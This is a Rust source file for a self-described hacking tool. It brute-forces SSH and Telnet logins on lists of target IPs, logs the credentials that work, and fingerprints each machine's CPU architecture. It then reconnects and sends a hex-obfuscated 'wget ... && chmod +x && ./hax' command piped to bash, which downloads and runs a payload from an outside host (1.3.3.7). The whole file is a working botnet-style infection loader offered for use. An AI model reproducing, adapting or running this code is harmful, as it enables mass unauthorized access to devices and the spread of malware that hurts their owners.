use std::io::{BufRead, BufReader, Write, Read};
use std::time::{Duration, Instant};
use std::fs::{File, OpenOptions};
use std::sync::{Arc, atomic::{AtomicUsize, Ordering}};
use std::net::ToSocketAddrs;
use telnet::{Telnet, Event};
use threadpool::ThreadPool;
use ssh2::Session;
use std::io;
use hex;

const SSH_PORTS: [u16; 4] = [22, 2222, 10001, 50000];
const TELNET_PORTS: [u16; 4] = [23, 2323, 4000, 5560];
const TIMEOUT_DURATION: Duration = Duration::from_secs(1);
const SSH_THREAD_POOL_SIZE: usize = 10;
const TELNET_THREAD_POOL_SIZE: usize = 10;

fn main() {
    println!("");
    println!("#############################################################################");
    println!("#                                                                           #");
    println!("# \x1b[92m███████╗██╗  ██╗██████╗ ███████╗██╗  ██╗███████╗██╗   ██╗██╗  ██╗███████╗ \x1b[0m#");
    println!("# \x1b[92m██╔════╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║ ██╔╝██╔════╝ \x1b[0m#");
    println!("# \x1b[92m███████╗███████║██████╔╝█████╗  █████╔╝ ███████╗██║   ██║█████╔╝ █████╗   \x1b[0m#");
    println!("# \x1b[92m╚════██║██╔══██║██╔══██╗██╔══╝  ██╔═██╗ ╚════██║██║   ██║██╔═██╗ ██╔══╝   \x1b[0m#");
    println!("# \x1b[92m███████║██║  ██║██║  ██║███████╗██║  ██╗███████║╚██████╔╝██║  ██╗███████╗ \x1b[0m#");
    println!("# \x1b[92m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ \x1b[0m#");
    println!("#            \x1b[91mSHREK IS BACK AND READY TO HACK THE FUCKING PLANET!            \x1b[0m#");                                                
    println!("#                                                                           #");
    println!("#############################################################################");
    println!("");

    let run_ssh = prompt_yes_no("\x1b[96mDo you want to run SSH? (\x1b[92my\x1b[0m/\x1b[91mn\x1b[0m):\x1b[96mn \x1b[0m");
    let run_telnet = prompt_yes_no("\x1b[96mDo you want to run Telnet? (\x1b[92my\x1b[0m/\x1b[91mn\x1b[0m):\x1b[96mn \x1b[0m");
    println!("");
    if !run_ssh && !run_telnet {
        println!("\x1b[91miz u stupid? or iz u dumb?\x1b[0m");
        return;
    }

    let ssh_ips = Arc::new(load_file("ssh_ips.txt"));
    let telnet_ips = Arc::new(load_file("telnet_ips.txt"));
    let ssh_users = Arc::new(load_file("ssh_user.txt"));
    let ssh_passwords = Arc::new(load_file("ssh_password.txt"));
    let telnet_users = Arc::new(load_file("telnet_user.txt"));
    let telnet_passwords = Arc::new(load_file("telnet_password.txt"));

    if run_ssh && (ssh_ips.is_empty() || ssh_users.is_empty() || ssh_passwords.is_empty()) {
        println!("\x1b[91mSSH files are empty\x1b[0m");
        return;
    }

    if run_telnet && (telnet_ips.is_empty() || telnet_users.is_empty() || telnet_passwords.is_empty()) {
        println!("\x1b[91mTelnet files are empty\x1b[0m");
        return;
    }

    let ssh_pool = ThreadPool::new(SSH_THREAD_POOL_SIZE);
    let telnet_pool = ThreadPool::new(TELNET_THREAD_POOL_SIZE);
    let ssh_completed_jobs = Arc::new(AtomicUsize::new(0));
    let telnet_completed_jobs = Arc::new(AtomicUsize::new(0));
    
    if run_ssh {
        let ssh_ips = Arc::clone(&ssh_ips);
        let ssh_users = Arc::clone(&ssh_users);
        let ssh_passwords = Arc::clone(&ssh_passwords);
        let ssh_completed_jobs = Arc::clone(&ssh_completed_jobs);

        for ip in ssh_ips.iter() {
            for user in ssh_users.iter() {
                for password in ssh_passwords.iter() {
                    for &port in &SSH_PORTS {
                        let ssh_completed_jobs = Arc::clone(&ssh_completed_jobs);
                        let ip = ip.clone();
                        let user = user.clone();
                        let password = password.clone();

                        ssh_pool.execute(move || {
                            match connect_via_ssh(&ip, &user, &password, port) {
                                Ok(arch) => {
                                    println!("[\x1b[96mSSH\x1b[0m] \x1b[92mSuccess!\x1b[0m \x1b[96mIP: {}:{} User: {} Pass: {} Architecture: {}\x1b[0m", ip, port, user, password, arch);
                                    log_successful_login("SSH", &ip, port, &user, &password);
                                }
                                Err(e) => {
                                    println!("[\x1b[96mSSH\x1b[0m] \x1b[91mFailed!\x1b[0m \x1b[96mIP: {}:{} User: {} Pass: {}\x1b[0m \x1b[91m{}\x1b[0m", ip, port, user, password, e);
                                }
                            }
                            ssh_completed_jobs.fetch_add(1, Ordering::SeqCst);
                        });
                    }
                }
            }
        }
    }

    if run_telnet {
        let telnet_ips = Arc::clone(&telnet_ips);
        let telnet_users = Arc::clone(&telnet_users);
        let telnet_passwords = Arc::clone(&telnet_passwords);
        let telnet_completed_jobs = Arc::clone(&telnet_completed_jobs);

        for ip in telnet_ips.iter() {
            for user in telnet_users.iter() {
                for password in telnet_passwords.iter() {
                    for &port in &TELNET_PORTS {
                        let telnet_completed_jobs = Arc::clone(&telnet_completed_jobs);
                        let ip = ip.clone();
                        let user = user.clone();
                        let password = password.clone();

                        telnet_pool.execute(move || {
                            match connect_via_telnet(&ip, &user, &password, port) {
                                Ok(arch) => {
                                    println!("[\x1b[96mTELNET\x1b[0m] \x1b[92mSuccess! | IP: {}:{} User: {} Pass: {} Architecture: {}\x1b[0m", ip, port, user, password, arch);
                                    log_successful_login("TELNET", &ip, port, &user, &password);
                                }
                                Err(e) => {
                                    println!("[\x1b[96mTELNET\x1b[0m] \x1b[91mFailed!\x1b[0m | \x1b[96mIP: {}:{} User: {} Pass: {} | \x1b[91m{}\x1b[0m", ip, port, user, password, e);
                                }
                            }
                            telnet_completed_jobs.fetch_add(1, Ordering::SeqCst);
                        });
                    }
                }
            }
        }
    }

    ssh_pool.join();
    telnet_pool.join();
    println!("\n\x1b[96mAll login attempts finished!\x1b[0m");
    println!("");
    reconnect_and_run_wget();
    println!("");
}

fn prompt_yes_no(prompt: &str) -> bool {
    print!("{}", prompt);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).expect("Failed to read input");
    let input = input.trim().to_lowercase();
    input == "y"
}

fn connect_via_ssh(ip: &str, user: &str, password: &str, port: u16) -> Result<String, String> {
    let addr = format!("{}:{}", ip, port);
    let start_time = Instant::now();
    let tcp = std::net::TcpStream::connect_timeout(&addr.parse().unwrap(), TIMEOUT_DURATION)
        .map_err(|e| format!(
            "\x1b[93mConnection to {}:{} timed out after {:.2?}. {}\x1b[0m",
            ip, port, start_time.elapsed(), e
        ))?;
    tcp.set_read_timeout(Some(TIMEOUT_DURATION))
        .map_err(|e| format!(
            "\x1b[96mCould not set read timeout: \x1b[91m{}\x1b[0m", e
        ))?;

    let mut session = Session::new()
        .map_err(|e| format!(
            "\x1b[96mFailed to create session: \x1b[91m{}\x1b[0m", e
        ))?;
    session.set_tcp_stream(tcp);
    session.handshake()
        .map_err(|e| format!(
            "\x1b[96mHandshake failed: \x1b[91m{}\x1b[0m", e
        ))?;

    if session.userauth_password(user, password).is_ok() {
        let mut channel = session.channel_session()
            .map_err(|e| format!(
                "\x1b[96mFailed to open channel: \x1b[91m{}\x1b[0m", e
            ))?;
        channel.exec("uname -m")
            .map_err(|e| format!(
                "\x1b[96mFailed to execute command: \x1b[91m{}\x1b[0m", e
            ))?;
        let mut arch = String::new();
        channel.read_to_string(&mut arch)
            .map_err(|e| format!(
                "\x1b[96mFailed to read architecture: \x1b[91m{}\x1b[0m", e
            ))?;
        channel.wait_close()
            .map_err(|e| format!(
                "\x1b[96mFailed to close channel: \x1b[91m{}\x1b[0m", e
            ))?;
        return Ok(arch.trim().to_string());
    }

    Err(format!(
        "\x1b[91mFailed to authenticate on \x1b[96m{}:{}\x1b[0m",
        ip, port
    ))
}

fn connect_via_telnet(ip: &str, user: &str, password: &str, port: u16) -> Result<String, String> {
    let addr = format!("{}:{}", ip, port);
    let socket_addr = addr.to_socket_addrs()
        .map_err(|e| format!("\x1b[91mFailed to resolve address: \x1b[96m{}", e))?
        .next()
        .ok_or_else(|| format!("\x1b[91mUnable to resolve address: \x1b[96m{}:{}", ip, port))?;

    let mut telnet = Telnet::connect_timeout(&socket_addr, 5000, TIMEOUT_DURATION)
        .map_err(|e| format!("\x1b[91mTelnet connection failed to \x1b[96m{}:{} - {}", ip, port, e))?;

    telnet.read_timeout(TIMEOUT_DURATION)
        .map_err(|e| format!("\x1b[96mFailed to read login prompt: \x1b[91m{}\x1b[0m", e))?;

    telnet.write(format!("{}\n", user).as_bytes())
        .map_err(|e| format!("\x1b[96mFailed to send username: \x1b[91m{}\x1b[0m", e))?;

    telnet.read_timeout(TIMEOUT_DURATION)
        .map_err(|e| format!("\x1b[96mFailed to read password prompt: \x1b[91m{}\x1b[0m", e))?;

    telnet.write(format!("{}\n", password).as_bytes())
        .map_err(|e| format!("\x1b[96mFailed to send password: \x1b[91m{}\x1b[0m", e))?;

    match telnet.read_timeout(TIMEOUT_DURATION) {
        Ok(Event::Data(data)) => {
            let response = String::from_utf8_lossy(&data);
            if response.contains("Login incorrect") || response.contains("failed") {
                Err(format!("\x1b[96mAuthentication failed for \x1b[91m{}:{}\x1b[0m", ip, port))
            } else {
                telnet.write(b"uname -m\n").map_err(|e| format!("\x1b[96mFailed to execute command: \x1b[91m{}\x1b[0m", e))?;
                match telnet.read_timeout(TIMEOUT_DURATION) {
                    Ok(Event::Data(data)) => {
                        let arch = String::from_utf8_lossy(&data).trim().to_string();
                        Ok(arch)
                    }
                    _ => Err(format!("\x1b[91mFailed to read uname response\x1b[0m")),
                }
            }
        }
        _ => Err(format!("\x1b[96mTelnet login failed for \x1b[96m{}:{}\x1b[0m", ip, port)),
    }
}

fn log_successful_login(protocol: &str, ip: &str, port: u16, user: &str, password: &str) {
    let log_message = format!("{},{},{},{},{}\n", protocol, ip, port, user, password);
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("successful_logins.txt")
        .expect("\x1b[91mFailed to open successful_logins.txt\x1b[0m");
    file.write_all(log_message.as_bytes()).expect("\x1b[96mFailed to write to successful_logins.txt\x1b[0m");
}

fn reconnect_and_run_wget() {
    if let Ok(lines) = read_lines("successful_logins.txt") {
        for line in lines {
            if let Ok(line) = line {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() == 5 {
                    let protocol = parts[0];
                    let ip = parts[1];
                    let port: u16 = parts[2].parse().unwrap_or(0);
                    let user = parts[3];
                    let password = parts[4];

                    if protocol == "SSH" {
                        if let Ok(session) = reconnect_via_ssh(ip, port, user, password) {
                            let _ = echo_load_ssh(&session, "http://1.3.3.7/hax", "hax"); // edit this
                        }
                    } else if protocol == "TELNET" {
                        if let Ok(mut telnet) = reconnect_via_telnet(ip, port, user, password) {
                            echo_load_telnet(&mut telnet, "http://1.3.3.7/hax", "hax").unwrap_or_else(|e| eprintln!("{}", e)); // edit this
                        }
                    }
                }
            }
        }
    } else {
		println!("");
        println!("\x1b[91mCould not open successful_logins.txt\x1b[0m");
		println!("");
    }
}

fn reconnect_via_ssh(ip: &str, port: u16, user: &str, password: &str) -> Result<Session, String> {
    let _addr = format!("{}:{}", ip, port);
    match std::net::TcpStream::connect_timeout(&_addr.parse().unwrap(), TIMEOUT_DURATION) {
        Ok(tcp) => {
            tcp.set_read_timeout(Some(TIMEOUT_DURATION))
                .expect("\x1b[91mCould not set read timeout\x1b[0m");
            let mut session = Session::new().map_err(|e| {
                format!("\x1b[96mFailed to create session: \x1b[91m{}\x1b[0m", e)
            })?;
            session.set_tcp_stream(tcp);
            session.handshake().map_err(|e| {
                format!("\x1b[96mHandshake failed: \x1b[91m{}\x1b[0m", e)
            })?;
            if session.userauth_password(user, password).is_ok() {
                Ok(session)
            } else {
                Err(format!(
                    "\x1b[91mFailed to authenticate on \x1b[96m{}:{}\x1b[0m",
                    ip, port
                ))
            }
        }
        Err(e) => Err(format!(
            "\x1b[96mConnection to {}:{} \x1b[91mfailed: {}\x1b[0m",
            ip, port, e
        )),
    }
}

fn reconnect_via_telnet(ip: &str, port: u16, user: &str, password: &str) -> Result<Telnet, String> {
    let addr = format!("{}:{}", ip, port);
    let socket_addr = addr.to_socket_addrs()
        .map_err(|e| format!("\x1b[96mFailed to resolve address: \x1b[91m{}", e))?
        .next()
        .ok_or_else(|| format!("\x1b[91mUnable to resolve address: \x1b[96m{}:{}", ip, port))?;

    let mut telnet = Telnet::connect_timeout(&socket_addr, 5000, TIMEOUT_DURATION)
        .map_err(|e| format!("\x1b[91mTelnet connection failed to \x1b[96m{}:{} - \x1b[91m{}", ip, port, e))?;

    telnet.read()
        .map_err(|e| format!(
            "\x1b[96mFailed to read login prompt: \x1b[91m{}\x1b[0m", e
        ))?;

    telnet.write(format!("{}\n", user).as_bytes())
        .map_err(|e| format!(
            "\x1b[96mFailed to send username: \x1b[91m{}\x1b[0m", e
        ))?;

    telnet.read()
        .map_err(|e| format!(
            "\x1b[96mFailed to read password prompt: \x1b[91m{}\x1b[0m", e
        ))?;

    telnet.write(format!("{}\n", password).as_bytes())
        .map_err(|e| format!(
            "\x1b[96mFailed to send password: \x1b[91m{}\x1b[0m", e
        ))?;

    match telnet.read() {
        Ok(Event::Data(data)) => {
            let response = String::from_utf8_lossy(&data);
            if response.contains("Login incorrect") || response.contains("failed") {
                Err(format!(
                    "\x1b[91mAuthentication failed for \x1b[91m{}:{}\x1b[0m",
                    ip, port
                ))
            } else {
                Ok(telnet)
            }
        }
        _ => Err(format!(
            "\x1b[91mTelnet login failed for \x1b[96m{}:{}\x1b[0m",
            ip, port
        )),
    }
}

fn echo_load_telnet(telnet: &mut Telnet, url: &str, filename: &str) -> Result<(), String> {
    let wget_command = format!(
        "wget --limit-rate=1m --no-check-certificate --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36\" \
        --referer=\"https://www.google.com\" --header=\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" \
        --header=\"Accept-Language: en-US,en;q=0.5\" --header=\"Connection: keep-alive\" --header=\"Upgrade-Insecure-Requests: 1\" \
        --header=\"DNT: 1\" {} -O {} && chmod +x {} && ./{}", url, filename, filename, filename
    );

    let hex_command = hex::encode(wget_command);
    let full_command = format!("echo {} | xxd -r -p | bash\n", hex_command);
    telnet.write(full_command.as_bytes()).map_err(|_e| format!("\x1b[91mFailed to send wget command via Telnet\x1b[0m"))?;

    telnet.read().map_err(|_e| format!("\x1b[91mFailed to read response after sending wget command\x1b[0m"))?;

    Ok(())
}

fn echo_load_ssh(session: &Session, url: &str, filename: &str) -> Result<(), String> {
    let wget_command = format!(
        "wget --limit-rate=1m --no-check-certificate --user-agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36\" \
        --referer=\"https://www.google.com\" --header=\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" \
        --header=\"Accept-Language: en-US,en;q=0.5\" --header=\"Connection: keep-alive\" --header=\"Upgrade-Insecure-Requests: 1\" \
        --header=\"DNT: 1\" {} -O {} && chmod +x {} && ./{}", url, filename, filename, filename
    );

    let hex_command = hex::encode(wget_command);
    let full_command = format!("echo {} | xxd -r -p | bash\n", hex_command);
    let mut channel = session.channel_session()
        .map_err(|_e| "\x1b[91mFailed to open SSH channel\x1b[0m".to_string())?;
    
    channel.exec(&full_command)
        .map_err(|_e| "\x1b[91mFailed to send wget command via SSH\x1b[0m".to_string())?;
    
    channel.wait_close()
        .map_err(|_e| "\x1b[91mFailed to close SSH channel\x1b[0m".to_string())?;

    Ok(())
}

fn read_lines(filename: &str) -> io::Result<io::Lines<BufReader<File>>> {
    let file = File::open(filename)?;
    Ok(BufReader::new(file).lines())
}

fn load_file(filename: &str) -> Vec<String> {
    File::open(filename)
        .map(|file| BufReader::new(file).lines().filter_map(|line| line.ok()).collect())
        .unwrap_or_else(|e| {
            println!("[\x1b[96mError reading {}: \x1b[91m{}\x1b[0m", filename, e);
            vec![]
        })
}
